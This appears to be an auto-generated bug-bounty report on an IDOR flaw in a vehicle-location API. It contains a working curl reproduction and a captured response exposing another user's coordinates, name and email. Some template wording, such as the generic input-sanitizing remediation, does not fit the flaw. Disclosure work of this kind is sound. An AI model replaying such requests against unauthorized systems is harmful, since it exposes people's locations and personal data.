# [Vulnerability Report] BOLA / IDOR in Vehicle Location via Public Internet Endpoint

## Summary
A security vulnerability was identified on `really-selective-fireplace-periods.trycloudflare.com` (operator_owned_target).
- **Vulnerability Class**: BOLA / IDOR in Vehicle Location
- **Triage Gate Verdict**: `VALID-PAYABLE` (Stage 5)
- **Severity (CVSS 3.1)**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- **Target Asset**: `https://really-selective-fireplace-periods.trycloudflare.com/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location`

---

## Technical Details & Root Cause
The endpoint fails to properly validate, authorize, or sanitize client-supplied input during request processing. 

### Vulnerable Request
```http
GET https://really-selective-fireplace-periods.trycloudflare.com/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location HTTP/1.1
Host: really-selective-fireplace-periods.trycloudflare.com
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...


```

### Server Response
```http
HTTP/1.1 200


{"carId":"f89b5f21-7829-45cb-a650-299a61090378","vehicleLocation":{"latitude":"32.778889","longitude":"-91.919243"},"fullName":"Adam","email":"adam007@example.com"}
```

---

## Step-by-Step Reproduction Steps

1. Send the following minimal HTTP request targeting `https://really-selective-fireplace-periods.trycloudflare.com/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location`:

```bash
curl -i -s -k -X GET \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9..." \
  "https://really-selective-fireplace-periods.trycloudflare.com/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location"
```

2. Inspect the HTTP response status code (`200`) and response payload.
3. Observe that Attacker session for hunter_demo@example.com accesses vehicle telemetry of victim adam007@example.com

---

## Impact
yes, business impact confirmed end-to-end with evidence on https://really-selective-fireplace-periods.trycloudflare.com/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location

- **Second Independent Session Verification**: Verified using a distinct secondary account/session.
- **Data Minimization & Blast Radius**: Only minimal proof-of-concept data was queried/transmitted; no persistent changes or denial of service were performed.

---

## Remediation Guidance
1. Enforce strict server-side authorization checks and input validation at the controller or model layer.
2. Ensure object-level access controls verify the current authenticated user's permission to access or mutate the requested resource.
3. Sanitize or encode all user-supplied data prior to rendering or downstream database query execution.
